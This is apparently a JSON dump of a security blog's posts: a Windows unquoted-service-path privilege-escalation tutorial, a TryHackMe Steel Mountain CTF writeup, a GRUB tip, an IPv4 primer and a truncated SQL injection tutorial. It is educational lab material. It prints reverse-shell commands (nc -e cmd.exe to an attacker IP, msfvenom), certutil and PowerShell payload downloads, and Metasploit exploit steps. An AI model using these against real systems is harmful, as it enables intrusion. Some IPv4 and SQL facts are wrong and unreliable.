[
  
    {
      "title"    : "Unquoted Service Path Vulnerability",
      "category" : "",
      "tags"     : "windows-privesc, unqoted-service-path, and windows",
      "url"      : "/2021/12/23/unquoted-service-path-vulnerability/",
      "date"     : "Dec 23, 2021",
      "content"  : "What is Unquoted Service Path ?Unquoted Service Path is a vulnerability that occurs when a service is created with a service path without appropriatequoting surrounding the path string, and if the path contains spaces, that can end up with a privilege escalation with thepermissions of whoever created the service.How it works ?Typically Service Control Manager will run the service’s executableby looking at its full path.  Path of the safe service -&gt; “C:\Program Files\a folder\b folder\c folder\vulnservice.exe”The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. Basically, the system will interpret the path as a full string. However, if the full path of the service file is not enclosed within quotation marks just like the following example:  Path of the vulnerable service -&gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exeThis time, for each space in the path, the system will append the .exe extension at the end of the most recent space. Thus the first string chunk of the folder name will be treated as an executable.Interpretation would be as following:  C:\Program.exe  C:\Program Files\a.exe : If Progam.exe does not exist, execute a.exe  C:\Program Files\a folder\b.exe : If a.exe does not exist, execute b.exe  C:\Program Files\a folder\b folder\c.exe : If b.exe does not exist, execute c.exe  C:\Program Files\a folder\b folder\c folder\vulnservice.exe : If c.exe does not exist, execute vulnservice.exeHow to exploit it ?Consider that you have gained a shell from a low privileged user in the system. However that user has the write permissionfor one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the first string chunk of its child folder.Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.Setting the LabIn order to exploit the vulnerability, we need to create one.Open up the start menu, and launch a command prompt by running it as an administrator.Create a low privileged user:net user krygen krygen /addPress Win+R, and run lusrmgr.src, to see all users and groups in the system.You can see the user krygen has been created successfully.It is also possbile to run ‘net user krygen’ to get same information from the command line.And the account belongs to the Users Group.To create a vulnerable service run this command:sc create "Vuln Service" binpath="C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe" Displayname= "Vulnerable Service" start= auto  sc.exe is the utility to create and interact with the services.  binpath is the path of the binary executable of the service.  Displayname is not mandatory, if you leave it blank, it will take the name of the service.  start is the start type, it can be either auto or manual. We can see the details of any service by runnig ‘sc qc {SERVICE NAME}’.Important fields to notice:  START_TYPE = AUTO_START -&gt; Service will start automatically when the sytem boots.  SERVICE_START_NAME = LocalSystem -&gt; Service will start with the LocalSystem service account privileges.LocalSystem is a service account, and it has the highest privileges of the system, which is the system root. Read more about Microsoft Service Accounts.Let create directories which is declared as a path for our service.mkdir "C:\Program Files\a folder\b folder\c folder"As you can see, it is not possible to start the service since the there is no executable in path.I will create two executables, both will delete different txt files from a specified path.One will delete burak.txt and the other, krygen.txt, for every 3 seconds.Source code for vulnservice.exeSource code for b.exeI have compiled both C codes with GCC and converted them into executables.Download gcc compilerPut the vulnservice.exe into the c folder. When I start the service manually, starting from C:\, the system will try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will be executed as expected behaviour.Let run the service:sc start "Vuln Service"First run: 0th second3rd secondNow put b.exe in a folder, then start the service again.Remember the execution the we have discussed at the beginning.First run: 0th secondAs you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system,but it was what we were expecting.3rd secondExploitationWe have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service manually and write any of the subdirectories of the service path.As the name suggests privilege escalation, is about raising our permissions to the LocalSystem/root permissions froma lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system.Let’s check the the ACL(Access Control List) of the ‘C:\Program Files\a folder’ with icacls. Run:icacls "C:\Program Files\a folder"The Users Group entry, BUILTIN\Users:(I)(RX), gives access read and execute permissions for every user who belongs to Users Group. The krygen user we have created at the beginning of the post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the write permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use a folder.Let us grant write access to Users Group for a folder.Run:icacls "C:\Program Files\a folder" /grant "BUILTIN\Users":WThen run:icacls "C:\Program Files\a folder"This time you will see a new entry BUILTIN\Users:(W)Now the user we have created, krygen, can write to that specific directory.Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user.We will assume that, somehow you have gained accessed to the system as the user krygen.I will use netcatin order to establish a connection and take a shell from krygen to my attacker machine.Run this on the attacker machine:nc -nvlp {SOME FREE PORT}Run that on the windows machine:nc -e cmd.exe {IP OF THE ATTACKER MACHINE} {PORT THE ATTACKER MACHINE LISTENS TO}Now that we have access to the krygen’s shell, we can try to write to all those a,b and c folders by attempting to create a new folder in each of them to test which one of them is accessible. We already know it is a folder, no harm double-checking.Folder creation is successfull inside ‘a folder’Failed to create folder inside ‘b folder’Failed to create folder inside ‘c folder’Since the directory that we can write is the a folder, if we want the service to execute our binary executableinstead of the service file, the name of the malicious executable should be the first chunk of the child directory, which isb.exe.I am going to use msfvenom to create a reverse shellbinary back to my machine.            Parameter      Functionality                  LHOST      The IP address that the reverse shell will connect              LPORT      The port that the reverse shell will connect              -p      Payload to use              -o      Name of the file              -f      File type of the output binary      Now we need to download the executable to the victim machine.Run this in the directory that your executable locates. It will start a web server inside of that directory.python -m http.server 80You can download any file from the running python server by using one of these utilites.powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}Double-check to see if the executable downloaded successfully into the directory to which you have the write access.Start a netcat listener on the port you declared in the reverse shell binary.Since we do not have LocalSystem permissions, it is impossible to start the service manually. However, the start type of the service is AUTO_START. Thus the service will be initialized at the system boot. All we have to do is reboot the systemand wait for the connection to establish.Run:sutdown /r /t 0Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine.The path we are in is system32, which means we have the console with administrator rights, have fun after that point :))).How to fix it ?First of all, run this to see if there is any service with an unquoted path variable.:wmic service get name,pathname,displayname,startmode | findstr /i auto |findstr /i /v "C:\Windows\" | findstr /i /v """If there is, then press Win+R and type regedit.exe, press enter.In the directory tree, search for the vulnerable service name under: Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet\Services\{SERVICE NAME}.Find the ImagePath entry, double click it.Change its value by surrounding the string with quotes.Run again, this time you should not see any results, you have fixed it:wmic service get name,pathname,displayname,startmode | findstr /i auto |findstr /i /v "C:\Windows\" | findstr /i /v """How to prevent it ?How on the world I can create a safe service ? Simple, when creating a service with sc.exe, do not pass the parameter for binpath like this:binpath= "C:\Program Files\a folder\b folder\c folder"Instead, do it like this:binpath= "\"C:\Program Files\a folder\b folder\c folder"\"Enjoy your safely created service.Thanks for reading.",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/12/23/unquoted-service-path-vulnerability/'> <img src='/assets/img/posts/unquoted-service-path-vulnerability/unquotedbanner.png' alt='Unquoted Service Path Vulnerability'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>12 min read <time class='article__date' datetime='2021-12-23T00:59:00+00:00'>Dec 23, 2021</time> </span> </div><h2 class='article__title'>Unquoted Service Path Vulnerability</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/windows-privesc' class='article__tag'>windows-privesc</a>  <a href='/tag/unqoted-service-path' class='article__tag'>unqoted-service-path</a>  <a href='/tag/windows' class='article__tag'>windows</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Tryhackme Steel Mountain CTF Writeup",
      "category" : "",
      "tags"     : "ctf, pentesting, remote-code-execution, windows-privesc, powershell, metasploit, and unqoted-service-path",
      "url"      : "/2021/12/23/tryhackme-steel-mountain-ctf-writeup/",
      "date"     : "Dec 23, 2021",
      "content"  : "Solve Yourself »The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different vulnerabilities that occur on the system.FIRST METHOD1-PreperationExport the ip address of the machine as a variable for shorthand usage.-&gt; export ip={MACHINE IP}2-EnumerationLet us run Network Mapper (nmap) to discover opened ports and services.            Parameter      Functionality                  -sV      Probe open ports to determine service/version info              -sS      SYN, half TCP scan              -O      Enable OS detection              -T4      T{0-5} Set scan speed, higher is faster              -p-      Scan all 65536 ports              -Pn      Skip host discovery              -oN      Write output to a file      Full command : nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}There is a web server running on port 80, let us visit.There is also one more web server is running at port 8080If you click on the HttpFileServer2.3 link under the Server Information heading, it will redirect you to the following page.It seems the HTTP server is being run by rejetto.There is a vulnerablity on the Rejetto HFS versions 2.3, 2.3a, and 2.3b, let’s check.CVE-Database -&gt; Rejetto HFS 2.3More detailed explaination3-ExploitationGaining Access to the System - Getting User FlagLaunch up your msfconsole and do a search for CVE-2014-6287 to see if there is any exploit that we can use.There is one with an excellent rank, awesome! Let us use it.Copy the THM IP with that command: ifconfig | grep -C 1 tun0 | tail -n 1 | awk '{print $2}'-&gt; set RPORT 8080-&gt; set RHOST machine IP-&gt; set LHOST your THM IP-&gt; exploit            Parameter      Functionality                  RPORT      The target port (TCP)              RHOST      Address of the target              LPORT      The listen port      After receiving meterpreter session, run shell to get an interactive shell.Find the flag under C:\users\bill\Desktop directory.Escalate the privileges - Getting the Root flagAfter gaining access to the system as a low-level user, it is time to get administrator privileges to have much more permissions against the system. PowerUp.ps1 is a program that facilitates fast checks in a windows machine to identify any misconfigurations and privilege escalation possibilities.-&gt; Download PowerUp.ps1-&gt; PowerSploit GitHub Repo-&gt; Run exit and get back to the meterpreter session.-&gt; Upload the script just as we did before to the machine.-&gt; Run load powershell-&gt; Run powershell_shellYou will get PowerShell this time instead of a regular cmd prompt.-&gt; Run . .\PowerUp.ps1-&gt; Run Invoke-AllChecksInvokeAllChecks will diagnose any detectable vulnerabilities along with their descriptions.The first result we got is a service called AdvancedSystemCare9, and it has a vulnerability called Unquoted Service Path -&gt; Read more about it. We will abuse this vulnerability. CanRestart field means that the current user, in this case, bill, can manually restart the service even thoughthe service itself is being run with LocalSystem service account permissions, which has the top-level privileges.LocalSystem Service AccountLaunch up msfvenom to deploy a reverse shell binary.            Parameter      Functionality                  LHOST      The IP address that the reverse shell will connect              LPORT      The port that the reverse shell will connect              -p      Payload to use              -o      Name of the file              -f      File type of the output binary      Full command -&gt; msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe-&gt; Upload the binary to the target machine.-&gt; Get the shell again.-&gt; Relocate the binary into C:\Program Files (x86)\IObit directory.-&gt; Rename the binary to Advanced.exe.Start a netcat listener on your machine with the port that is defined when creatingthe backdoor.-&gt; nc -nvlp {SPECIFIED PORT}After starting a netcat session, restart the service-&gt; sc stop AdvancedSystemCareService9-&gt; sc start AdvancedSystemCareService9When the service boots, Advanced.exe backdoor binary will be executed instead of the ASCService.exe. You can find the root flag root.txt under C:\Users\Administrator\Desktop directory.SECOND METHODIn this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.1-Preperation-&gt; Copy Advanced.exe or create a new backdoor executable with msfvenom just like before.-&gt; Download winPEAS.bat-&gt; Download static binary nc.exe-&gt; Download PowerUp.ps1 or use the previous one if you downloaded it before.-&gt; Download CVE-2014-6287.py or from ExploitdbYour directory should look like this2-ExploitationEdit the cve20146287.py file, set the ip_addr field to your THM IP, and set the local_port to any free port.Start a netcat listener on the port you declared in the python file.Run it twice. At first run the server will download nc.exe static binary from your server. At second, it will runnc.exe to connect to your local machine by providing a CMD prompt.It is possible to use PowerUp.ps1 again or winPEAS.bat can be used to enumerate misconfigurations.You can download any file from the running python server by using one of these utilites.-&gt; powershell -c "Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"-&gt; certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on Advanced System Care9service and many others.You will need to repeat previous steps to get the root flag. Download Advanced.exe with Invoke-WebRequest orcertutil, start a Netcat listener and restart the service.Thank you for following, wish you more penetrations ;)",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/12/23/tryhackme-steel-mountain-ctf-writeup/'> <img src='/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/steelbanner.jpg' alt='Tryhackme Steel Mountain CTF Writeup'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>7 min read <time class='article__date' datetime='2021-12-23T00:50:00+00:00'>Dec 23, 2021</time> </span> </div><h2 class='article__title'>Tryhackme Steel Mountain CTF Writeup</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/ctf' class='article__tag'>ctf</a>  <a href='/tag/pentesting' class='article__tag'>pentesting</a>  <a href='/tag/remote-code-execution' class='article__tag'>remote-code-execution</a>  <a href='/tag/windows-privesc' class='article__tag'>windows-privesc</a>  <a href='/tag/powershell' class='article__tag'>powershell</a>  <a href='/tag/metasploit' class='article__tag'>metasploit</a>  <a href='/tag/unqoted-service-path' class='article__tag'>unqoted-service-path</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Add Windows Boot Manager to Grub",
      "category" : "",
      "tags"     : "linux, windows, grub, and boot-managers",
      "url"      : "/2021/11/18/add-windows-boot-manager-to-grub/",
      "date"     : "Nov 18, 2021",
      "content"  : "If you want to add windows boot manager to grub, follow these steps;1-Download os-prober2-Run:sudo os-proberIf there is an output like that, you are good to go:-&gt; sudo os-prober/dev/nvme1n1p1@/EFI/Microsoft/Boot/bootmgfw.efi:Windows Boot Manager:Windows:efi3- Append this line, GRUB_DISABLE_OS_PROBER=false, to the /etc/default/grub file.4- Run:sudo grub-mkconfig -o /boot/grub/grub.cfgDone ! You will see all bootable system in your grub menu at the next boot.",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/11/18/add-windows-boot-manager-to-grub/'> <img src='/assets/img/posts/add-windows-boot-manager-to-grub/wgbanner.png' alt='Add Windows Boot Manager to Grub'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>1 min read <time class='article__date' datetime='2021-11-18T12:00:00+00:00'>Nov 18, 2021</time> </span> </div><h2 class='article__title'>Add Windows Boot Manager to Grub</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/linux' class='article__tag'>linux</a>  <a href='/tag/windows' class='article__tag'>windows</a>  <a href='/tag/grub' class='article__tag'>grub</a>  <a href='/tag/boot-managers' class='article__tag'>boot-managers</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "IPv4 Protocol",
      "category" : "",
      "tags"     : "network protocols and ip-addresses",
      "url"      : "/2021/11/18/ipv4-addresses/",
      "date"     : "Nov 18, 2021",
      "content"  : "image:    src: /assets/img/posts/ipv4-protocol/ip1.jpg    alt: SUBNETTING    width: 800    height: 450—IPv4IPv4 stands for Internet Protocol version 4. IPs are addresses for users on the internet. Messages and packages delivered viaIP addresses. IPv4 address spaces consists of four octets. Depending on the class and configuration, some portion of bits in theoctet represents the network ID, while the rest represents hosts.An IP address consists of 4 octets, whichdetermines the class and configuration of a network, for example you can think of an IP address as Octet1.Octet2.Octet3.Octet4There are 5 IPv4 classes that determines which portion of the network is usable for devices you want to connect and how much ofthem are allowed. Each has its own usable address spaces for maximum range of devices.CLASS AClass A type is for big scale network insfrastructures with large number of total hosts needed.By using the first octet for thenetwork ID, class A grants for 126 networks with 16,777,214 hosts per network. The first bit in the first octet is always zero, the rest of the7 bits creates different network ID’s when they are turned on.            Network Bits: first octet      Host Bits:last three octets                  01111111      00000000      00000000      00000000        Public IP Range: 1.0.0.0 to 127.0.0.0          Range for first octet value from 1 to 127        Private IP Range: 10.0.0.0 10.255.255.255  Number of networks: 126  Number of hosts: 16,777,214  Subnet Mask: 255.0.0.0 (8 bits)CLASS BClass B type is for medium to large-sized networks. By using the first two octets for the network ID, class B grants for16,382 networks with 65,534 hosts per network. The first two bits of the first octet are always 1 and 0, the rest of the 14 bits creates different network ID’s when they are turned on.            Network Bits: first two octets      Host Bits: last two octets                  10111111      11111111      00000000      00000000        Public IP Range: 128.0.0.0 to 192.255.0.0          Range for first octet value from 128 to 191        Private IP Range: 172.16.0.0 to 172.31.255.255  Subnet Mask: 255.255.0.0 (16 bits)  Number of networks: 16,382  Number of hosts: 65,534CLASS CCass C type is for small-sized local area networks (LANs). By using the first three octets for the network ID, class C grants for2,097,150 networks with 254 hosts per network. The first three bits of the first are always 1 1 0, the rest of the 21 bits createsdifferent network ID’s when they are turned on.            Network Bits: first three octets      Host Bits: last octet                  11011111      11111111      11111111      00000000        Public IP Range: 192.0.0.0 to 223.255.255.0          Range for first octet value from 192 to 223        Private IP Range: 192.168.0.0 to 192.168.255.255  Special IP Range: 127.0.0.1 to 127.255.255.255  Subnet Mask: 255.255.255.0 (24 bits)  Number of networks: 2,097,150  Number of hosts: 254CLASS DClass D type is not for hosts and used for multicasting. In order to send a stream of data  to thousands of nodes across the Internet concurrently, multicasting is required. Mostly used for video, audio streaming and broadcast any kind of altered globaldata to the institutions or organizations, for example currency rate information.  Range 224.0.0.0 to 230.255.255.255          First octet value range from 224 to 239        Number of Networks: NULL  Number of Hosts per Network: Network MulticastingCLASS EClass E type is reserved addresses for research purposes (NASA etc.), and not available for regular users.  Range 240.0.0.0 255.255.255.255          First octet value range from 244 to 255        Number of Networks: NULL  Number of Hosts per Network: Experimental/Reserved/ResearchPRIVATE IP ADDRESSESWithin every and each network class, there are specified IP addresses that are specifically reserved for internal/private use only. These IP addresses cannot use internet as they are not routeable and ensure internal communication. For instance, FTP and web servers have to use public IP addresses instead of private. However, within a business or a home network, private IP addresses leased to the devices.  Class A Private Range: from 10.0.0.0 to 10.255.255.255 Class B APIPA Private Range: from 169.254.0.0 to 169.254.255.255          In general, a Dynamic Host Configuration Protocol (DHCP) server is used to lease IP addresses to any woken device within the network. However, if there is not one, or the device is not configured properly for DHCP offer, Automatic Private IP Addressing(APIPA) is used to assign a private IP address to the device in question if it is a Microsoft-based device.        Class B Private Range: from 172.16.0.0 172.31.255.255  Class C Private Range: from 192.168.0.0 to 192.168.255.255SPECIAL IP ADDRESSESIP Range from 127.0.0.1 to 172.255.255.255 are used for network testing, which also referred as loop-back addresses. These arevirtual IP addresses and can not be assigned to a device as a logical address. The most common one is 127.0.0.1, which is repeatedly used to troubleshoot the network connectivity issues using the ICMP protocol. Ifthere is a connectivity issue, before checking for network infrastructures or the other nodes, making sure of the TCP/IP stackis correctly working on that machine must be prior check as the ICMP packet that you sent to that special IP address tests eachlayer. If ping responses with a packet loss, then the connectivity issue is on the local computer, you would need to resolvethis first. If there is no packet loss, you can start to explore other possibilities that may cause failure.",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/11/18/ipv4-addresses/'> <img src='/assets/img/posts/ipv4-protocol/ip1.jpg' alt='IPv4 Protocol'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>5 min read <time class='article__date' datetime='2021-11-18T12:00:00+00:00'>Nov 18, 2021</time> </span> </div><h2 class='article__title'>IPv4 Protocol</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/network protocols' class='article__tag'>network protocols</a>  <a href='/tag/ip-addresses' class='article__tag'>ip-addresses</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "SQL Injection",
      "category" : "",
      "tags"     : "sql and sql-injection",
      "url"      : "/2021/10/13/sql-injection/",
      "date"     : "Oct 13, 2021",
      "content"  : "In this article you will learn SQL Injection fundamentals from 0 to hero.In order to understand SQL injections, it is essential to observe those two concepts seperately.WHAT IS INJECTION ?Injection refers to a broad variety of attack vectors. An attacker feeds the program with malicious input.This input interpreted by the program and works for attacker’s favour.This vulnerability occurs when the input is not controlled with meticulousness before or after input has taken.There are bunch of different kind of injections out there.Examples are javascript ,ldap, xpath, host header, code, email header and crlf injections and SQL injection is one of them.WHAT IS SQL ?SQL stands for simple query language. What it does is basically, managing data held in databases.It is particularly useful in handling structured data. So whenever you ask for spesific part of datayou can request it in any order or concatanate it with different data held in different data table. There are bunch of different sql types, MySQL, SqLite, PostgreSQL, Microsoft SQL Server and etc. They areactually more or less all the same except for the syntax diffrences between them.Understanding SQLLet us examine the behavior of SQL codes by using sqliteonlineWhy SQL ?As you can see, there is a table consists of 3 columns and 21 rows.Those are basically key and value pairs.In this spesific example ID is the Key value, Name and Hint are the values which defined by that spesific ‘ID’ numer of 1.However, as you can guess, it is not practical to summon whole data each time when we want to use or see one or couple parts of the data. In addition, we may want to combine different data parts together, so that is why we use SQL.SQL BasicsEvery table has its own name, and the name of the table above is demo.It is not needed to be an expertSQL programmer, but you need to understand the principles of SQL programming, so let us start with some basics.SELECT * FROM demo;This command selects everything from demo table, fetches full content from the table.You can see the output at the picture above. SELECT * FROM demo WHERE ID=3;If you want to bring the informations related to ‘ID’ number of 3, you can add WHERE clause at the end of the query, and specify the filter.SELECT * FROM demo WHERE ID=3 UNION SELECT * FROM demo WHERE Name="Chart";You can concatenate two different queries together by using ‘UNION’, however result of thequeries have to have same amount of columns, otherwise it will not work. In this example, there isonly one table called demo, so naturally all the selections will have 3 columns.If the result of the select queries of differenttables have different amount of columns, you can not UNION the result of the selections together.SELECT * FROM demo ORDER BY name ASC;You can order the table with ORDER BY clause.You can either put column number with numerics, or column nameboth ASC ascending and DESC descending order.SELECT table_name FROM INFORMATION_SCHEMA.TABLES ORDER BY 1 ASC;See all the tables existing in the currently active database.SHOW DATABASES;See all the created databases.SummaryUnderstanding this much of SQL will do for now.In this section I wrote about basics of SQL, however in the followingsections I will be writing about tricks and tactics about SQL Injection, it is more imporant to understand very fundamentalsrather than complex queries.PRIMITIVES OF DATABASE LOGICFrom now on, you know how sql works, and the idea behind that. In this section, before moving on to the exploitation phase, you will learn bare-bones of SQLi, database logic and do some brainstorm. In this section I will be using MariaDB, it is communitydeveloped database management system for MySQL.MariaDB/MySQLI fired up my terminal and run my mariadb service. Without selecting any database or any table, I will run the following query.Try to guess the result of it.MariaDB [(none)]&gt; SELECT 1;It returns+---+| 1 | #&gt;&gt;&gt; This is the column name+---+| 1 | #&gt;&gt;&gt; This is the value corresponds to that column.+---+Does not make too much sense right ? Let us move further.MariaDB [(none)]&gt; SELECT 2-1;How do you think this will end up ?+-----+| 2-1 |+-----+|   1 |+-----+From now on, we know that we can do mathematical operations with integers in sql, this is huge.MariaDB [(none)]&gt; SELECT '2-1';It is same as before except for the single quotes.+-----+| 2-1 |+-----+| 2-1 |+-----+This time what we see is returning of a string value. It is reasonable because single or double quotesare used for strings.MariaDB [(none)]&gt; SELECT '2'-'1';It is hard to predict what is going to happen this time right ? Let us see.+---------+| '2'-'1' |+---------+|       1 |+---------+Database actually performed the same mathematical operation as before when we did SELECT 2-1. That is because just like you,database’s mind get confused too, so it came up with an idea that ‘Oh wait, I can cast them into integers !’.Now we are one morestep closer to understand the primitive behaviour of how databases work actually.MariaDB [(none)]&gt; SELECT '2'+'a';+---------+| '2'+'a' |+---------+|       2 |+---------+Hmm, brains burning right ? It is simple really, just like before database converted string value to integer, however it could not converta to any integer, so it considered it as 0.By having this knowledge you should guess the output of this query.MariaDB [(none)]&gt; SELECT 'b'+'a';You predicted it ?+---------+| 'b'+'a' |+---------+|       0 |+---------+This time two non-convertible to integer values given into single quoutes, database performed 0+0 this time.MariaDB[(none)]&gt; SELECT '2' '1';This time instead putting an operation sign between those strings, we will left it blank.+----+| 2  |+----+| 21 |+----+As you can see, strings had been concatanated. So SELECT '2' '1' and concat('2','1') do the same thing.MariaDB[(none)]&gt; SELECT '2' '1' 'a';You should be able to guess this one.+-----+| 2   |+-----+| 21a |+-----+Yes you are right, still string concat.MariaDB[(none)]&gt; SELECT '2' '1' 'a'-1;From now on we know that, 'a'-1 will result -1. So this time instead of string concat, it will substract-1 from 21.+---------------+| '2' '1' 'a'-1 |+---------------+|            20 |+---------------+There are few operants that you need to know.^=XOR operator!=NOT operatorDisciplineWe have discovered some primitive behaviours of the database. Now we need to understandwhich discipline we need to adopt to find a sql injection.Lets say there is a back end code running at the server just like that.PSEUDO CODEid=request.get('id')query="SELECT * FROM news WHERE id ="+idresult = db.execute(query)if result.size()&gt;0:    for i in result:        print(i.title)else:    print("No news")This is the pseudo code to illustrate possible setup working on a web server to bring html document.However we do not have access to this backend code, so what we are trying to do is that, we need to observethe behavior of the responds to see if there is an injection possiblity.Now lets say there are two html pages, one for id ‘1’, and one for id ‘2’:ID1&lt;h1&gt;This is html document for ID 1&lt;/h1&gt;ID2&lt;h1&gt;This is html document for ID 2&lt;/h1&gt;While we dont have access to backend code, we can modify url.www.xyz.com/?id=As you can tell, we can bring one of those two html documents by passing related ID number to the ?id= parameter.Right now all the behaviour we have learned should make sense. We can either make request for ?id=1 or =id=2-1, bothwill bring the first html document which has ID1.Principles  We need to determine an initial, referance point for our examination.In this case, it is html document of ID1 which we trying to return.  Try to access to the initial point with different methods.In this case we forced database to make that 2-1 operation to get out initial point.From now on, we broke the system, we have observed that, it is possible for us to manipulate the database with an unexcpectedbehavior. Key point is that, you could return your referance point with avoiding expected behavior.The question is that, what now ? How we can turn this vulnerability to our favour ? In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is notpossible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where UNION saves the day.Instead of passing 1 or 2 or 2-1 into the ?id= field, we can pass 1 UNION SELECT (rest of the query)As you remember that is the code at the back end.query="SELECT * FROM news WHERE id ="+idwww.xyz.com/?id='1 UNION SELECT .....' Query will run this for http request above-&gt; SELECT * FROM news WHERE id=1 UNION SELECT (rest of the query) However at this point of time, we have two problems.1-What I will select in my own query ? What will replace the ,I do not know anything about the database.2-UNION has its limitations, the number of columns that return for each query should match.It is time to do some real sql injection on a web page.VULNWEB - UNION SQLihttp://test.php.vulnweb.com is a vulnerable website for pentesting practice. Navigate to the web page.Remembering the principlesAs we talked it about before, we have a principle that has two parts.1-Determine your referance point2-Find a way to get back to that referance point with unexpected behavior.Making sure of SQL injection’s existenceNavigate to http://testphp.vulnweb.com/listproducts.php?cat=1 This will be our referance point.Than to http://testphp.vulnweb.com/listproducts.php?cat=2 As we see different cat id brings different items from table.Than go for http://testphp.vulnweb.com/listproducts.php?cat=2-1 We tried an unexpected behavior, and eventually returned to our referance point.Thus, now it is certain that this web site vulnerable to sql injection.And this is because there is no input validation in the source code that is running on server sideand anybody can pass whatever value they want in the input field, in this case in the ?id= field.Guessing the designIf you observe the url, you can guess there is a table named listproducts and a column named cat.Backend code may work like that:SELECT (some unknown column names) FROM listproducts WHERE cat=Of course those names are not the same like thatat the source code, so we still do not know any names from the database.And of course it may not work like that, just like I said, it is guessing.After observing the behavior of the test.php.vulnweb, this pseudo code seems appropriate.id=request.get('id')query="SELECT (some unknown column names) FROM listproducts WHERE cat="+idresult = db.execute(query)if result.size()&gt;0:    for i in result:        print(i.title)        print(i.img)        print(i.description)        print(i.author)else:    passFinding the column countAs we talked before, after finding the vulnerability with 2-1, it is crucial to run our own queries.UNION will be starting point for this example. However we need toknow how many columns there are.The way to do that is enumerate: 1 UNION SELECT 1 to 1 UNION SELECT 1....x.As you can see, when the number of columns are not match, this happens.To give you better understanding about thisI will demonstrate this on my local machine with a test table.MariaDB [test]&gt; SELECT * FROM users;+----------+----------+-----------+| PersonID | LastName | FirstName |+----------+----------+-----------+|        1 | Baris    | Burak     ||        1 | Baris    | Burak     ||        1 | Baris    | Burak     ||        1 | Baris    | Burak     ||        2 | Baris2   | Burak2    ||        3 | Baris3   | Burak3    |+----------+----------+-----------+MariaDB [test]&gt; SELECT * FROM users WHERE PErsonID=3;+----------+----------+-----------+| PersonID | LastName | FirstName |+----------+----------+-----------+|        3 | Baris3   | Burak3    |+----------+----------+-----------+MariaDB [test]&gt; SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1;ERROR 1222 (21000): The used SELECT statements have a different number of columnsMariaDB [test]&gt; SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1,2;ERROR 1222 (21000): The used SELECT statements have a different number of columnsMariaDB [test]&gt; SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1,2,3;+----------+----------+-----------+| PersonID | LastName | FirstName |+----------+----------+-----------+|        3 | Baris3   | Burak3    ||        1 | 2        | 3         |+----------+----------+-----------+There are three columns for this table, Person ID, LastName, FirstName.It means the second query I will run after UNION should alsohave three columns to create an appropriate table. It actually makes sense, because it would be weird to have a concatanated table with a blank column.As you can see I am getting the same error 